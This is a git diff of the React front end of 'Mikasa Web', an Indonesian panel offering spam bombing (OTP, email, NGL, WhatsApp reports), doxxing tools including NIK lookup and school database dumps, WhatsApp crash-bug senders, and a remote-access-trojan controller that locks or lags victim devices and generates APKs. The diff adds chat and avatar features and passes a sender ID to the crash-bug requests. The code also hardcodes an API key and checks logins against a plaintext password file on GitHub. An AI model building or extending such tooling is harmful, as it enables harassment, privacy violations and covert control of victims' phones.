@@ -1,14 +1,14 @@
 "use client";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { io } from "socket.io-client";
-import { 
-  Home as HomeIcon, Menu, User, Lock, Eye, EyeOff, 
-  MessageSquare, Plus, Wrench, DownloadCloud, 
-  Search, Bug, Send, X, ChevronLeft, ShieldAlert, Globe, 
-  FileText, Play, Pause, Gamepad2, Music, CheckCircle2, 
-  Dices, Grid3X3, Crown, CircleDollarSign, Users, 
+import {
+  Home as HomeIcon, Menu, User, Lock, Eye, EyeOff,
+  MessageSquare, Plus, Wrench, DownloadCloud,
+  Search, Bug, Send, X, ChevronLeft, ShieldAlert, Globe,
+  FileText, Play, Pause, Gamepad2, Music, CheckCircle2,
+  Dices, Grid3X3, Crown, CircleDollarSign, Users,
   Loader2, LogOut, Settings, Camera,
-  Clock, Shield, Phone, Link, Mail, MapPin, 
+  Clock, Shield, Phone, Link, Mail, MapPin,
   CreditCard, Smartphone, Server, Flame, School, Ban, UserSearch,
   Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle
 } from "lucide-react";
@@ -17,16 +17,36 @@ import { GameCatur, GameUno, GameUlarTangga, GameSpy, GameTicTacToe } from "./ga
 
 const API_URL = "https://api-mikasacloud.my.id";
 const API_KEY = "rahasia_banget_123";
-const VIDEO_1 = "https://j.top4top.io/m_3944kuzbh0.mp4"; 
-const VIDEO_2 = "https://d.top4top.io/m_3944j368i0.mp4"; 
+const VIDEO_1 = "https://j.top4top.io/m_3944kuzbh0.mp4";
+const VIDEO_2 = "https://d.top4top.io/m_3944j368i0.mp4";
 const INTRO_VIDEO = "https://c.top4top.io/m_39443olav1.mp4";
 const INTRO_AUDIO = "https://l.top4top.io/m_3944pw6n51.mp3";
 const SOUND_1 = "https://b.top4top.io/m_39442c6f31.m4a";
 const SOUND_2 = "https://k.top4top.io/m_3944rcsvx1.mp3";
 const RAT_VIDEO = "https://a.top4top.io/m_39451serc1.mp4";
 
-let globalAudio = null; 
-let bgmAudio = null;    
+let globalAudio = null;
+let bgmAudio = null;
+
+function loadAvatarMap() {
+  try {
+    const raw = localStorage.getItem("mikasa_avatars");
+    return raw ? JSON.parse(raw) : {};
+  } catch { return {}; }
+}
+function saveAvatarMap(map) {
+  try { localStorage.setItem("mikasa_avatars", JSON.stringify(map)); } catch {}
+}
+function getAvatarFor(uname) {
+  if (typeof window === "undefined") return "";
+  const map = loadAvatarMap();
+  return map[uname] || "";
+}
+function setAvatarFor(uname, b64) {
+  const map = loadAvatarMap();
+  map[uname] = b64;
+  saveAvatarMap(map);
+}
 
 const ALL_TOOLS = [
   { id: 'spamotp', name: "Spam OTP", sub: "Bomb OTP", desc: "Mengirim spam OTP massal ke nomor target.", endpoint: "/api/spamotp", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: MessageSquare, color: "text-pink-500" },
@@ -35,7 +55,7 @@ const ALL_TOOLS = [
   { id: 'spamngl', name: "Spam NGL", sub: "Bomb NGL", desc: "Mengirim pesan anonim massal ke akun NGL.", endpoint: "/api/spamngl", payload: "username", placeholder: "username", cat: "Spam", icon: UserSearch, color: "text-yellow-500" },
   { id: 'spamrepwa', name: "Spam Rep", sub: "Report WA", desc: "Mengirim laporan spam ke WhatsApp.", endpoint: "/api/spamrepwa", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: ShieldAlert, color: "text-rose-500" },
   { id: 'spamgmail', name: "Spam Mail", sub: "Bomb Email", desc: "Mengirim spam email ke alamat target.", endpoint: "/api/spamgmail", payload: "email", placeholder: "email@gmail.com", cat: "Spam", icon: Mail, color: "text-blue-400" },
-  
+
   { id: 'osintnomor', name: "OSINT Nomor", sub: "Lacak Nomor", desc: "Melacak informasi dari nomor HP target.", endpoint: "/api/osint-nomor", payload: "nomor", placeholder: "628xxx", cat: "OSINT", icon: Smartphone, color: "text-cyan-500" },
   { id: 'osintusername', name: "OSINT Usr", sub: "Lacak Usn", desc: "Melacak akun media sosial berdasarkan username.", endpoint: "/api/osint-username", payload: "username", placeholder: "username", cat: "OSINT", icon: UserSearch, color: "text-teal-500" },
   { id: 'iptracker', name: "IP Tracker", sub: "Lacak IP", desc: "Melacak lokasi dan info dari alamat IP.", endpoint: "/api/iptracker", payload: "ip", placeholder: "8.8.8.8", cat: "OSINT", icon: Globe, color: "text-indigo-500" },
@@ -43,15 +63,15 @@ const ALL_TOOLS = [
   { id: 'nikparse', name: "NIK Parse", sub: "Baca NIK", desc: "Membaca informasi dari nomor NIK.", endpoint: "/api/nikparse", payload: "nik", placeholder: "16 digit", cat: "OSINT", icon: FileText, color: "text-fuchsia-500" },
   { id: 'cekwallet', name: "Cek Wallet", sub: "Cek E-Wallet", desc: "Mengecek kepemilikan e-wallet dari nomor.", endpoint: "/api/cekwallet", payload: "nomor", placeholder: "08xxx", cat: "OSINT", icon: CreditCard, color: "text-emerald-500" },
   { id: 'doxschool', name: "DoxSchool", sub: "Dump Data", desc: "Dump database sekolah berdasarkan NPSN.", endpoint: "/api/doxschool", payload: "npsn", placeholder: "8 digit NPSN", cat: "OSINT", icon: Database, color: "text-amber-500" },
-  
+
   { id: 'bug-wa-verload', name: "Verload FC", sub: "Bug WA", desc: "Mengirim bug Verload FC ke target.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Flame, color: "text-red-600", extra: {type: "verload"} },
   { id: 'bug-wa-forceclose', name: "Force Close", sub: "Bug WA", desc: "Mengirim bug Force Close ke target.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Bug, color: "text-orange-600", extra: {type: "forceclose"} },
   { id: 'bug-wa-crashcall', name: "Crash Call", sub: "Bug WA", desc: "Mengirim bug Crash Call ke target.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Phone, color: "text-rose-600", extra: {type: "crashes"} },
-  
+
   { id: 'tt', name: "TikTok DL", sub: "Unduh Video", desc: "Mengunduh video dari link TikTok.", endpoint: "/api/download/tiktok", payload: "url", placeholder: "Link TikTok", cat: "Download", icon: DownloadCloud, color: "text-pink-400" },
   { id: 'ig', name: "IG DL", sub: "Unduh Foto", desc: "Mengunduh foto/video dari link Instagram.", endpoint: "/api/download/instagram", payload: "url", placeholder: "Link IG", cat: "Download", icon: Camera, color: "text-purple-400" },
   { id: 'fb', name: "FB DL", sub: "Unduh Video", desc: "Mengunduh video dari link Facebook.", endpoint: "/api/download/facebook", payload: "url", placeholder: "Link FB", cat: "Download", icon: Globe, color: "text-blue-600" },
-  
+
   { id: 'cekkodepos', name: "Kode Pos", sub: "Cari Wilayah", desc: "Mencari informasi wilayah dari kode pos.", endpoint: "/api/cekkodepos", payload: "kodepos", placeholder: "16112", cat: "Utility", icon: MapPin, color: "text-lime-500" },
   { id: 'ceknpsn', name: "Cek NPSN", sub: "Data Sekolah", desc: "Mencari data sekolah berdasarkan NPSN.", endpoint: "/api/ceknpsn", payload: "npsn", placeholder: "40203594", cat: "Utility", icon: School, color: "text-amber-500" },
   { id: 'cekff', name: "Cek FF", sub: "Nickname FF", desc: "Mengecek nickname Free Fire dari UID.", endpoint: "/api/cekff", payload: "uid", placeholder: "UID FF", cat: "Utility", icon: Flame, color: "text-orange-500" },
@@ -62,12 +82,43 @@ const ALL_TOOLS = [
 
 const CATEGORIES = ["Semua", "Spam", "OSINT", "BugWA", "Download", "Utility"];
 
+function UserAvatar({ name, avatarMap = {}, size = 14, border = "border-zinc-600" }) {
+  const [b64, setB64] = useState("");
+  useEffect(() => {
+    if (avatarMap[name]) {
+      setB64(avatarMap[name]);
+    } else {
+      setB64(getAvatarFor(name));
+    }
+  }, [name, avatarMap]);
+
+  const src = b64 || `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(name)}&backgroundColor=1a1a24`;
+  const px = size * 4;
+  return (
+    <div className={`rounded-full border-2 ${border} overflow-hidden bg-zinc-800 flex items-center justify-center shrink-0`} style={{ width: px, height: px }}>
+      <img src={src} alt={name} className="w-full h-full object-cover" />
+    </div>
+  );
+}
+
+function timeFmt(ts) {
+  if (!ts) return "";
+  const d = new Date(ts);
+  return d.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
+}
+
+function dateFmt(ts) {
+  if (!ts) return "";
+  const d = new Date(ts);
+  return d.toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" });
+}
+
 export default function Home() {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
-  const [showIntro, setShowIntro] = useState(false); 
-  const [showTapToPlay, setShowTapToPlay] = useState(false); 
-  const [isScanning, setIsScanning] = useState(false); 
-  
+  const [showIntro, setShowIntro] = useState(false);
+  const [showTapToPlay, setShowTapToPlay] = useState(false);
+  const [isScanning, setIsScanning] = useState(false);
+
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -85,26 +136,34 @@ export default function Home() {
 
   const [socket, setSocket] = useState(null);
   const [onlineUsers, setOnlineUsers] = useState([]);
+  const [serverAvatars, setServerAvatars] = useState({});
+
   const [globalMsgs, setGlobalMsgs] = useState([]);
-  const [msgInput, setMsgInput] = useState("");
-  const [chatMode, setChatMode] = useState("global"); 
-  const [chatTarget, setChatTarget] = useState(null); 
   const [privateMsgs, setPrivateMsgs] = useState([]);
+  const [msgInput, setMsgInput] = useState("");
+  const [chatMode, setChatMode] = useState("global");
+  const [chatTarget, setChatTarget] = useState(null);
+
+  const [unreadGlobal, setUnreadGlobal] = useState(0);
+  const [unreadPrivMap, setUnreadPrivMap] = useState({});
+  const [unreadTotal, setUnreadTotal] = useState(0);
+
+  const chatScrollRef = useRef(null);
 
   const [toolCategory, setToolCategory] = useState("Semua");
-  const [activeTool, setActiveTool] = useState(null); 
-  
+  const [activeTool, setActiveTool] = useState(null);
+
   const [toolTarget, setToolTarget] = useState("");
   const [toolResult, setToolResult] = useState(null);
   const [toolLoading, setToolLoading] = useState(false);
-  
+
   const [senderActive, setSenderActive] = useState(false);
   const [showSenderModal, setShowSenderModal] = useState(false);
   const [senderNumber, setSenderNumber] = useState("");
   const [senderCode, setSenderCode] = useState("");
   const [senderLoading, setSenderLoading] = useState(false);
 
-  const [activeGame, setActiveGame] = useState(null); 
+  const [activeGame, setActiveGame] = useState(null);
 
   const [musicSearch, setMusicSearch] = useState("");
   const [musicResults, setMusicResults] = useState([]);
@@ -126,6 +185,294 @@ export default function Home() {
 
   const [showPinModal, setShowPinModal] = useState(false);
   const [lockPin, setLockPin] = useState("");
+
+  useEffect(() => {
+    if (chatScrollRef.current) {
+      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
+    }
+  }, [globalMsgs, privateMsgs, activeTab, chatMode, chatTarget]);
+
+  useEffect(() => {
+    const savedUser = localStorage.getItem("mikasa_user");
+    if (savedUser) {
+      const parsed = JSON.parse(savedUser);
+      const uname = parsed.username;
+      const persistedAvatar = getAvatarFor(uname);
+      setUsername(uname);
+      setUserRole(parsed.role);
+      setUserProfile({
+        name: parsed.profile?.name || uname,
+        avatar: persistedAvatar || parsed.profile?.avatar || "",
+        expired: parsed.profile?.expired || "2054-02-25"
+      });
+      setIsLoggedIn(true);
+      setShowTapToPlay(true);
+    }
+
+    const timer = setInterval(() => {
+      const now = new Date();
+      setCurrentTime(now.toLocaleTimeString('id-ID', { hour12: false, hour: '2-digit', minute: '2-digit' }));
+      const hours = String(now.getHours()).padStart(2, '0');
+      const minutes = String(now.getMinutes()).padStart(2, '0');
+      setRuntime(`${hours}:${minutes}`);
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, []);
+
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    setLoginError("");
+    try {
+      const res = await fetch("https://raw.githubusercontent.com/d3c0d34njK0Too0l/mikasa-web/main/users.json");
+      const users = await res.json();
+      const validUser = users.find(u => u.username === username && u.password === password);
+
+      if (validUser) {
+        const role = validUser.role ? validUser.role.toUpperCase() : "FREE";
+        setUserRole(role);
+        const persistedAvatar = getAvatarFor(username);
+        const profile = {
+          name: username,
+          avatar: persistedAvatar || "",
+          expired: "2054-02-25"
+        };
+        setUserProfile(profile);
+        localStorage.setItem("mikasa_user", JSON.stringify({ username, role, profile }));
+        setShowIntro(true);
+      } else {
+        setLoginError("Akun tidak ditemukan.");
+      }
+    } catch (err) {
+      setLoginError("Gagal terhubung ke database.");
+    }
+  };
+
+  const handleSkipIntro = () => {
+    setShowIntro(false);
+    setIsLoggedIn(true);
+    startBGM();
+    setShowTapToPlay(false);
+  };
+
+  const handleFingerprintTap = () => {
+    if (isScanning) return;
+    setIsScanning(true);
+
+    setTimeout(() => {
+      startBGM();
+      setShowTapToPlay(false);
+      setIsScanning(false);
+    }, 1500);
+  };
+
+  const handleLogout = () => {
+    localStorage.removeItem("mikasa_user");
+    setIsLoggedIn(false);
+    setUsername("");
+    setPassword("");
+    setIsSidebarOpen(false);
+    if(socket) socket.close();
+    if(ratSocket) ratSocket.close();
+    if(bgmAudio) { bgmAudio.pause(); bgmAudio = null; }
+    if(globalAudio) { globalAudio.pause(); globalAudio = null; }
+  };
+
+  useEffect(() => {
+    if (isLoggedIn && !showIntro) {
+      const newSocket = io(API_URL);
+      setSocket(newSocket);
+      newSocket.emit('user_online', username);
+
+      if (userProfile.avatar) {
+        newSocket.emit('update_avatar', { username, avatar: userProfile.avatar });
+      }
+
+      newSocket.on('update_online_users', (users) => setOnlineUsers(users.filter(u => u !== username)));
+
+      newSocket.on('avatar_snapshot', (snapshot) => {
+        setServerAvatars(snapshot || {});
+      });
+
+      newSocket.on('avatar_update', ({ username: uname, avatar }) => {
+        setServerAvatars((prev) => {
+          const copy = { ...prev };
+          if (avatar) copy[uname] = avatar;
+          else delete copy[uname];
+          return copy;
+        });
+      });
+
+      newSocket.on('chat_history_global', (history) => {
+        setGlobalMsgs(history || []);
+      });
+
+      newSocket.on('receive_global_msg', (data) => {
+        setGlobalMsgs((prev) => [...prev, data]);
+      });
+
+      newSocket.on('chat_history_private', ({ with: withUser, messages }) => {
+        if (withUser === chatTarget) {
+          setPrivateMsgs(messages || []);
+        }
+      });
+
+      newSocket.on('receive_private_msg', (data) => {
+        if (chatMode === "private" && chatTarget && (data.from === chatTarget || data.to === chatTarget)) {
+          setPrivateMsgs((prev) => {
+            const exists = prev.some(m => m.ts === data.ts && m.from === data.from && m.msg === data.msg);
+            if (exists) return prev;
+            return [...prev, data];
+          });
+        }
+      });
+
+      newSocket.on('unread_snapshot', (snap) => {
+        setUnreadGlobal(snap.global || 0);
+        setUnreadPrivMap(snap.priv || {});
+        setUnreadTotal(snap.total || 0);
+      });
+
+      newSocket.on('unread_update', (snapshot) => {
+        if (snapshot && typeof snapshot[username] === "number") {
+          setUnreadTotal(snapshot[username]);
+        }
+      });
+
+      const s = io(API_URL, { transports: ["websocket"] });
+      setRatSocket(s);
+
+      s.on("rat_update_devices", (devices) => {
+        const myDevices = devices.filter(d => d.ownerId === username || d.ownerId === null);
+        setOnlineDevices(myDevices);
+      });
+
+      return () => {
+        newSocket.close();
+        s.close();
+      }
+    }
+  }, [isLoggedIn, showIntro, username, chatMode, chatTarget, userProfile.avatar]);
+
+  const sendGlobalMsg = (e) => {
+    e.preventDefault();
+    if (!msgInput.trim() || !socket) return;
+    socket.emit('send_global_msg', { from: username, msg: msgInput });
+    setMsgInput("");
+  };
+
+  const sendPrivateMsg = (e) => {
+    e.preventDefault();
+    if (!msgInput.trim() || !socket || !chatTarget) return;
+    const data = { from: username, to: chatTarget, msg: msgInput };
+    socket.emit('send_private_msg', data);
+    setMsgInput("");
+  };
+
+  const openGlobalChat = () => {
+    setChatMode("global");
+    setChatTarget(null);
+    setActiveTab("chat");
+    if (socket) {
+      socket.emit('chat_history_request_global');
+      socket.emit('chat_read_global', { username });
+    }
+    setUnreadGlobal(0);
+    setUnreadTotal((prev) => Math.max(0, prev - unreadGlobal));
+  };
+
+  const openPrivateChat = (targetUser) => {
+    setChatTarget(targetUser);
+    setChatMode("private");
+    setPrivateMsgs([]);
+    setActiveTab("chat");
+    if (socket) {
+      socket.emit('chat_history_request_private', { userA: username, userB: targetUser });
+      socket.emit('chat_read_private', { username, withUser: targetUser });
+    }
+    setUnreadPrivMap((prev) => {
+      const copy = { ...prev };
+      const decrement = copy[targetUser] || 0;
+      copy[targetUser] = 0;
+      setUnreadTotal((t) => Math.max(0, t - decrement));
+      return copy;
+    });
+  };
+
+  const handleSearchMusic = async (e) => {
+    if (e) e.preventDefault();
+    if (!musicSearch.trim()) return;
+    setLoadingMusic(true);
+    try {
+      const res = await fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(musicSearch)}&media=music&limit=25`);
+      const data = await res.json();
+      setMusicResults(data.results || []);
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setLoadingMusic(false);
+    }
+  };
+
+  const togglePlay = (e) => {
+    if (e) e.stopPropagation();
+    if (!globalAudio) return;
+    if (isPlaying) {
+      globalAudio.pause();
+      setIsPlaying(false);
+    } else {
+      globalAudio.play();
+      setIsPlaying(true);
+    }
+  };
+
+  const playMusic = (track) => {
+    if (!track.previewUrl) return alert("Lagu tidak ada preview.");
+    if (bgmAudio) { bgmAudio.pause(); bgmAudio = null; }
+    if (currentSong?.trackId === track.trackId) { togglePlay(); return; }
+    if (globalAudio) { globalAudio.pause(); globalAudio.currentTime = 0; }
+    globalAudio = new Audio(track.previewUrl);
+    globalAudio.play();
+    globalAudio.onended = () => setIsPlaying(false);
+    setCurrentSong(track);
+    setIsPlaying(true);
+  };
+
+  const handleSaveProfile = (e) => {
+    e.preventDefault();
+    setAvatarFor(username, userProfile.avatar);
+    const updatedProfile = { ...userProfile };
+    const savedUser = JSON.parse(localStorage.getItem("mikasa_user"));
+    savedUser.profile = updatedProfile;
+    localStorage.setItem("mikasa_user", JSON.stringify(savedUser));
+    setUserProfile(updatedProfile);
+    setShowProfileModal(false);
+
+    if (socket && socket.connected) {
+      socket.emit('update_avatar', { username, avatar: userProfile.avatar });
+    }
+  };
+
+  const handleAvatarChange = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onloadend = () => setUserProfile(prev => ({ ...prev, avatar: reader.result }));
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const startBGM = () => {
+    if (bgmAudio) return;
+    bgmAudio = new Audio(SOUND_1);
+    bgmAudio.play().then(() => {
+      bgmAudio.onended = () => {
+        bgmAudio = new Audio(SOUND_2);
+        bgmAudio.loop = true;
+        bgmAudio.play().catch(e => console.log(e));
+      };
+    }).catch(e => console.log("Autoplay blocked:", e));
+  };
 
   const handleGenerateAPK = async () => {
     setIsGenerating(true);
@@ -180,7 +527,7 @@ export default function Home() {
     if (key === 'lag') command = newState ? "lag_on" : "lag_off";
 
     setRatLoading(true);
-    
+
     ratSocket.emit("rat_command", {
       deviceId: ratTargetId,
       command: command,
@@ -197,197 +544,6 @@ export default function Home() {
     toggleRat('lock', lockPin);
   };
 
-  const startBGM = () => {
-    if (bgmAudio) return; 
-    bgmAudio = new Audio(SOUND_1);
-    bgmAudio.play().then(() => {
-      bgmAudio.onended = () => {
-        bgmAudio = new Audio(SOUND_2);
-        bgmAudio.loop = true;
-        bgmAudio.play().catch(e => console.log(e));
-      };
-    }).catch(e => console.log("Autoplay blocked:", e));
-  };
-
-  useEffect(() => {
-    const savedUser = localStorage.getItem("mikasa_user");
-    if (savedUser) {
-      const parsed = JSON.parse(savedUser);
-      setUsername(parsed.username);
-      setUserRole(parsed.role);
-      setUserProfile(parsed.profile || { name: parsed.username, avatar: "", expired: "2054-02-25" });
-      setIsLoggedIn(true);
-      setShowTapToPlay(true); 
-    }
-
-    const timer = setInterval(() => {
-      const now = new Date();
-      setCurrentTime(now.toLocaleTimeString('id-ID', { hour12: false, hour: '2-digit', minute: '2-digit' }));
-      const hours = String(now.getHours()).padStart(2, '0');
-      const minutes = String(now.getMinutes()).padStart(2, '0');
-      setRuntime(`${hours}:${minutes}`);
-    }, 1000);
-
-    return () => clearInterval(timer);
-  }, []);
-
-  const handleLogin = async (e) => {
-    e.preventDefault();
-    setLoginError("");
-    try {
-      const res = await fetch("https://raw.githubusercontent.com/d3c0d34njK0Too0l/mikasa-web/main/users.json");
-      const users = await res.json();
-      const validUser = users.find(u => u.username === username && u.password === password);
-      
-      if (validUser) {
-        const role = validUser.role ? validUser.role.toUpperCase() : "FREE";
-        setUserRole(role);
-        const profile = { name: username, avatar: "", expired: "2054-02-25" };
-        setUserProfile(profile);
-        localStorage.setItem("mikasa_user", JSON.stringify({ username, role, profile }));
-        setShowIntro(true);
-      } else {
-        setLoginError("Akun tidak ditemukan.");
-      }
-    } catch (err) {
-      setLoginError("Gagal terhubung ke database.");
-    }
-  };
-
-  const handleSkipIntro = () => {
-    setShowIntro(false);
-    setIsLoggedIn(true);
-    startBGM(); 
-    setShowTapToPlay(false); 
-  };
-
-  const handleFingerprintTap = () => {
-    if (isScanning) return;
-    setIsScanning(true);
-    
-    setTimeout(() => {
-      startBGM();
-      setShowTapToPlay(false);
-      setIsScanning(false);
-    }, 1500);
-  };
-
-  const handleLogout = () => {
-    localStorage.removeItem("mikasa_user");
-    setIsLoggedIn(false);
-    setUsername("");
-    setPassword("");
-    setIsSidebarOpen(false);
-    if(socket) socket.close();
-    if(ratSocket) ratSocket.close();
-    if(bgmAudio) { bgmAudio.pause(); bgmAudio = null; }
-    if(globalAudio) { globalAudio.pause(); globalAudio = null; }
-  };
-
-  useEffect(() => {
-    if (isLoggedIn && !showIntro) {
-      const newSocket = io(API_URL);
-      setSocket(newSocket);
-      newSocket.emit('user_online', username);
-      newSocket.on('update_online_users', (users) => setOnlineUsers(users.filter(u => u !== username)));
-      newSocket.on('receive_global_msg', (data) => setGlobalMsgs((prev) => [...prev, data]));
-      newSocket.on('receive_private_msg', (data) => setPrivateMsgs((prev) => [...prev, data]));
-      
-      const s = io(API_URL, { transports: ["websocket"] });
-      setRatSocket(s);
-
-      s.on("rat_update_devices", (devices) => {
-        const myDevices = devices.filter(d => d.ownerId === username || d.ownerId === null);
-        setOnlineDevices(myDevices);
-      });
-
-      return () => {
-        newSocket.close();
-        s.close();
-      }
-    }
-  }, [isLoggedIn, showIntro, username]);
-
-  const sendGlobalMsg = (e) => {
-    e.preventDefault();
-    if (!msgInput.trim() || !socket) return;
-    socket.emit('send_global_msg', { from: username, msg: msgInput });
-    setMsgInput("");
-  };
-
-  const sendPrivateMsg = (e) => {
-    e.preventDefault();
-    if (!msgInput.trim() || !socket || !chatTarget) return;
-    const data = { from: username, to: chatTarget, msg: msgInput };
-    socket.emit('send_private_msg', data);
-    setMsgInput("");
-  };
-
-  const openPrivateChat = (targetUser) => {
-    setChatTarget(targetUser);
-    setChatMode("private");
-    setPrivateMsgs([]); 
-    setActiveTab("chat");
-  };
-
-  const handleSearchMusic = async (e) => {
-    if (e) e.preventDefault();
-    if (!musicSearch.trim()) return;
-    setLoadingMusic(true);
-    try {
-      const res = await fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(musicSearch)}&media=music&limit=25`);
-      const data = await res.json();
-      setMusicResults(data.results || []);
-    } catch (err) {
-      console.error(err);
-    } finally {
-      setLoadingMusic(false);
-    }
-  };
-
-  const togglePlay = (e) => {
-    if (e) e.stopPropagation();
-    if (!globalAudio) return;
-    if (isPlaying) {
-      globalAudio.pause();
-      setIsPlaying(false);
-    } else {
-      globalAudio.play();
-      setIsPlaying(true);
-    }
-  };
-
-  const playMusic = (track) => {
-    if (!track.previewUrl) return alert("Lagu tidak ada preview.");
-    if (bgmAudio) { bgmAudio.pause(); bgmAudio = null; } 
-    if (currentSong?.trackId === track.trackId) { togglePlay(); return; }
-    if (globalAudio) { globalAudio.pause(); globalAudio.currentTime = 0; }
-    globalAudio = new Audio(track.previewUrl);
-    globalAudio.play();
-    globalAudio.onended = () => setIsPlaying(false);
-    setCurrentSong(track);
-    setIsPlaying(true);
-  };
-
-  const handleSaveProfile = (e) => {
-    e.preventDefault();
-    const updatedProfile = { ...userProfile };
-    const savedUser = JSON.parse(localStorage.getItem("mikasa_user"));
-    savedUser.profile = updatedProfile;
-    localStorage.setItem("mikasa_user", JSON.stringify(savedUser));
-    setUserProfile(updatedProfile);
-    setShowProfileModal(false);
-  };
-
-  const handleAvatarChange = (e) => {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onloadend = () => setUserProfile(prev => ({ ...prev, avatar: reader.result }));
-      reader.readAsDataURL(file);
-    }
-  };
-
   const executeTool = async () => {
     if (!activeTool || !toolTarget) return;
     setToolLoading(true);
@@ -397,9 +553,13 @@ export default function Home() {
     if (activeTool.extra) Object.assign(payloadBody, activeTool.extra);
     payloadBody[activeTool.payload] = toolTarget;
 
+    if (activeTool.endpoint === "/api/bug-wa") {
+      payloadBody.senderId = username;
+    }
+
     if (activeTool.id === 'spamgmail') {
         payloadBody.email = toolTarget;
-        payloadBody.message = "Pesan spam dari Mikasa Web"; 
+        payloadBody.message = "Pesan spam dari Mikasa Web";
     }
 
     try {
@@ -448,7 +608,7 @@ export default function Home() {
       if (val === null) return <span className="text-zinc-500 italic">null</span>;
       if (typeof val === 'boolean') return <span className={val ? "text-green-400" : "text-red-400"}>{val.toString()}</span>;
       if (typeof val === 'string' || typeof val === 'number') return <span className="text-white break-words">{val.toString()}</span>;
-      
+
       if (Array.isArray(val)) {
         if (val.length === 0) return <span className="text-zinc-500 italic">Kosong</span>;
         return (
@@ -462,7 +622,7 @@ export default function Home() {
           </div>
         );
       }
-      
+
       if (typeof val === 'object') {
         return (
           <div className="pl-3 border-l border-zinc-700 mt-1 space-y-1">
@@ -486,7 +646,7 @@ export default function Home() {
         <div className="space-y-2">
            {Object.entries(data).map(([key, value]) => {
              if (key === 'status' && value === true) return null;
-             
+
              return (
                <div key={key} className="flex flex-col">
                  <span className="text-zinc-400 text-xs font-bold capitalize mb-1">{key.replace(/_/g, ' ')}</span>
@@ -598,17 +758,17 @@ export default function Home() {
 
           <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
             <label className="text-xs text-zinc-400 block mb-2">Target / Input</label>
-            <input 
-              type="text" 
-              value={toolTarget} 
-              onChange={(e) => setToolTarget(e.target.value)} 
-              className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white mb-4" 
-              placeholder={activeTool.placeholder || "Masukkan target..."} 
+            <input
+              type="text"
+              value={toolTarget}
+              onChange={(e) => setToolTarget(e.target.value)}
+              className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white mb-4"
+              placeholder={activeTool.placeholder || "Masukkan target..."}
             />
             <button onClick={executeTool} disabled={toolLoading} className="w-full bg-zinc-600 text-white font-bold py-3 rounded-lg flex justify-center items-center">
               {toolLoading ? <Loader2 className="animate-spin" size={20}/> : "Eksekusi"}
             </button>
-            
+
             {toolResult && renderToolResult(toolResult)}
           </div>
         </main>
@@ -633,7 +793,7 @@ export default function Home() {
   );
 
   const renderProfileModal = () => {
-    if (!showProfileModal) return null; 
+    if (!showProfileModal) return null;
     return (
       <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
         <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl w-full max-w-sm p-6 relative">
@@ -700,12 +860,12 @@ export default function Home() {
           <div className="space-y-4">
             <div>
               <label className="text-xs text-zinc-400 block mb-1">PIN Rahasia</label>
-              <input 
-                type="text" 
-                value={lockPin} 
-                onChange={(e) => setLockPin(e.target.value.replace(/\D/g, ''))} 
-                className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white text-center text-xl tracking-widest" 
-                placeholder="Contoh: 123456" 
+              <input
+                type="text"
+                value={lockPin}
+                onChange={(e) => setLockPin(e.target.value.replace(/\D/g, ''))}
+                className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white text-center text-xl tracking-widest"
+                placeholder="Contoh: 123456"
                 maxLength={8}
               />
             </div>
@@ -720,16 +880,16 @@ export default function Home() {
 
   return (
     <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans pb-24">
-      
+
       {showTapToPlay && (
-        <div 
-          onClick={handleFingerprintTap} 
+        <div
+          onClick={handleFingerprintTap}
           className="fixed inset-0 bg-black/95 z-[999] flex flex-col items-center justify-center cursor-pointer transition-opacity duration-500"
         >
           <div className={`relative flex items-center justify-center w-32 h-32 rounded-full border-2 transition-all duration-300 ${isScanning ? 'border-green-500 shadow-[0_0_30px_rgba(34,197,94,0.5)]' : 'border-zinc-600'}`}>
-             <Fingerprint 
-                size={64} 
-                className={`transition-colors duration-300 ${isScanning ? 'text-green-500' : 'text-zinc-400'}`} 
+             <Fingerprint
+                size={64}
+                className={`transition-colors duration-300 ${isScanning ? 'text-green-500' : 'text-zinc-400'}`}
              />
              {isScanning && (
                 <div className="absolute inset-0 flex items-center justify-center bg-black/60 rounded-full backdrop-blur-sm">
@@ -770,7 +930,7 @@ export default function Home() {
       {activeGame === 'tictactoe' && <GameTicTacToe level="medium" onClose={() => setActiveGame(null)} />}
 
       <main className="px-4 max-w-md mx-auto mt-2 space-y-6">
-        
+
         {activeTab === "home" && (
           <>
             <div className="bg-gradient-to-br from-zinc-800 to-zinc-900 border border-zinc-700 rounded-3xl p-6 relative overflow-hidden shadow-2xl">
@@ -810,12 +970,15 @@ export default function Home() {
                   <span className="text-[10px] text-zinc-400">Tambah</span>
                 </div>
                 {onlineUsers.map((name, i) => (
-                  <div key={i} onClick={() => openPrivateChat(name)} className="flex flex-col items-center gap-1 min-w-[60px] cursor-pointer">
